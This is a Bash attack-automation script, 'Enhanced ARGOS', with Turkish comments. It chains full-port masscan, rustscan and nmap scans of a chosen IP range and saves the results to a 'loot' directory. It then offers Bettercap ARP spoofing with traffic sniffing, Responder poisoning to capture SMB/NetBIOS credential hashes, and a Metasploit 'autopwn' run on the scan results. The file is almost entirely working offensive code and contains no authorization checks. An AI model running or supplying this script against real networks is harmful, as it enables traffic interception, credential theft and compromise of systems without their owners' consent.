#!/usr/bin/env bash
###############################################################################
# Enhanced ARGOS - Network Analysis
# Gelişmiş ağ tarama ve otomasyon betiği
###############################################################################

RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
RESET="\033[0m"

cat << "EOF"
           _______ 
   _   _ \___    _|
  |  \| |/ _ \ |
  | |\  |  __/ |  
  |_| \_|\___|_|
                NETWORK ANALYSIS
EOF

RANGE="$1"
if [ -z "$RANGE" ]; then
  echo -ne "${CYAN}Enter target IP range or CIDR (e.g., 192.168.1.0/24): ${RESET}"
  read -r RANGE
fi
[ -z "$RANGE" ] && { echo -e "${RED}[!] No range provided.${RESET}"; exit 1; }

LOOT_DIR="./loot/network"
mkdir -p "$LOOT_DIR"
TS=$(date +%Y%m%d_%H%M%S)

echo -e "${GREEN}[+] Starting network analysis on: $RANGE${RESET}"

# Masscan Tarama
if command -v masscan >/dev/null; then
  echo -ne "${CYAN}[?] Masscan rate [default=10000]: ${RESET}"
  read -r MSRATE
  MSRATE=${MSRATE:-10000}
  MS_OUT="$LOOT_DIR/masscan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}.txt"
  echo -e "${CYAN}[*] Masscan scanning all ports at rate=$MSRATE ...${RESET}"
  sudo masscan "$RANGE" -p1-65535 --rate "$MSRATE" -oL "$MS_OUT" \
    2>&1 | stdbuf -oL tr '\r' '\n'
fi

# RustScan Tarama
if command -v rustscan >/dev/null; then
  RS_OUT="$LOOT_DIR/rustscan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}.txt"
  echo -e "${CYAN}[*] RustScan scanning ...${RESET}"
  rustscan -a "$RANGE" --ulimit 5000 -o "$RS_OUT" 2>&1 | stdbuf -oL tr '\r' '\n'
fi

# Nmap Tarama
if command -v nmap >/dev/null; then
  SCAN="nmap_scan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}"
  echo -e "${CYAN}[*] Nmap scanning all ports ...${RESET}"
  nmap -p- -sV -sC -O -Pn "$RANGE" -oA "$LOOT_DIR/$SCAN" \
    2>&1 | stdbuf -oL tr '\r' '\n'

  # Masscan ile tespit edilen portları tekrar tara
  if [ -f "$MS_OUT" ]; then
    PORTS=$(grep -oP '(?<=open tcp ).*' "$MS_OUT" | tr '\n' ',' | sed 's/,$//')
    if [ -n "$PORTS" ]; then
      SPEC_OUT="$LOOT_DIR/nmap_specific_$(echo "$RANGE" | sed 's|/|_|g')_${TS}"
      echo -e "${CYAN}[*] Nmap scanning open ports: $PORTS${RESET}"
      nmap -p"$PORTS" -sV -sC -O "$RANGE" -oA "$SPEC_OUT" \
        2>&1 | stdbuf -oL tr '\r' '\n'
    fi
  fi
fi

# Bettercap (MITM ve ARP zehirleme)
if command -v bettercap >/dev/null; then
  echo -ne "${CYAN}[?] Run Bettercap for MITM/ARP spoofing? (y/N): ${RESET}"
  read -r RUN_BC
  if [[ "$RUN_BC" =~ ^[Yy]$ ]]; then
    echo -e "${CYAN}[*] Starting Bettercap ...${RESET}"
    sudo bettercap -eval "set arp.spoof.targets $RANGE; arp.spoof on; net.sniff on;" \
      2>&1 | tee "$LOOT_DIR/bettercap_${TS}.log"
  fi
fi

# Responder (SMB ve diğer kimlik doğrulama analizleri)
if command -v responder >/dev/null; then
  echo -ne "${CYAN}[?] Run Responder for SMB/NetBIOS analysis? (y/N): ${RESET}"
  read -r RUN_RESP
  if [[ "$RUN_RESP" =~ ^[Yy]$ ]]; then
    echo -e "${CYAN}[*] Starting Responder ...${RESET}"
    sudo responder -I eth0 -wrf 2>&1 | tee "$LOOT_DIR/responder_${TS}.log"
  fi
fi

# Metasploit Otomasyonu
if [ -f "./metasploit.sh" ]; then
  NMAP_XML="$LOOT_DIR/${SCAN}.xml"
  if [ -f "$NMAP_XML" ]; then
    echo -ne "${CYAN}[?] Run Metasploit autopwn on nmap XML? (y/N): ${RESET}"
    read -r MSF_RUN
    if [[ "$MSF_RUN" =~ ^[Yy]$ ]]; then
      echo -e "${CYAN}[*] Launching Metasploit autopwn ...${RESET}"
      bash ./metasploit.sh --xml "$NMAP_XML" --loot "$LOOT_DIR" --force-dbimport \
        2>&1 | stdbuf -oL tr '\r' '\n'
    fi
  fi
fi

echo -e "${GREEN}[NETWORK] Done. Results in $LOOT_DIR${RESET}"
exit 0
